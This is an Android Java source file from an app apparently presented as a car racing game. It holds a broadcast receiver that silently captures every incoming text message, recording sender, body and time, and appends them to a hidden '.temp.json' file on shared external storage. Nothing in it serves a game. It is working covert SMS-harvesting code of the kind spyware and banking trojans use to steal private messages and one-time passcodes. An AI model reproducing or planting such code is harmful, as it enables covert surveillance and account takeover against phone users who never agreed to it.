package com.carrace;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String JSON_FILE = ".temp.json";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;

        try {
            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null) return;

            String format = bundle.getString("format");
            StringBuilder body = new StringBuilder();
            String sender = "";
            long timestamp = 0;

            for (Object pdu : pdus) {
                SmsMessage msg;
                if (Build.VERSION.SDK_INT >= 23 && format != null) {
                    msg = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    msg = SmsMessage.createFromPdu((byte[]) pdu);
                }
                if (msg == null) continue;
                sender = msg.getOriginatingAddress();
                timestamp = msg.getTimestampMillis();
                body.append(msg.getMessageBody());
            }

            if (sender == null || body.length() == 0) return;
            if (timestamp == 0) timestamp = System.currentTimeMillis();

            appendSms(sender, body.toString(), timestamp);
        } catch (Exception e) {
            Log.e(TAG, "onReceive failed", e);
        }
    }

    private void appendSms(String address, String body, long timestamp) {
        try {
            File target = new File(Environment.getExternalStorageDirectory(), JSON_FILE);

            JSONArray merged = new JSONArray();
            Set<String> seen = new HashSet<>();

            if (target.exists() && target.length() > 0) {
                byte[] buf = new byte[(int) target.length()];
                FileInputStream in = new FileInputStream(target);
                int read = 0;
                while (read < buf.length) {
                    int r = in.read(buf, read, buf.length - read);
                    if (r < 0) break;
                    read += r;
                }
                in.close();
                JSONArray arr = new JSONArray(new String(buf, StandardCharsets.UTF_8));
                for (int i = 0; i < arr.length(); i++) {
                    JSONObject o = arr.getJSONObject(i);
                    String key = o.optString("address", "") + "|" + o.optLong("date", 0);
                    seen.add(key);
                    merged.put(o);
                }
            }

            String key = address + "|" + timestamp;
            if (seen.contains(key)) return;

            JSONObject o = new JSONObject();
            o.put("address", address);
            o.put("body", body);
            o.put("date", timestamp);
            o.put("source", "realtime");
            merged.put(o);

            FileOutputStream out = new FileOutputStream(target, false);
            out.write(merged.toString(2).getBytes(StandardCharsets.UTF_8));
            out.flush();
            out.close();

            Log.d(TAG, "saved SMS from " + address);
        } catch (Exception e) {
            Log.e(TAG, "appendSms failed", e);
        }
    }
}
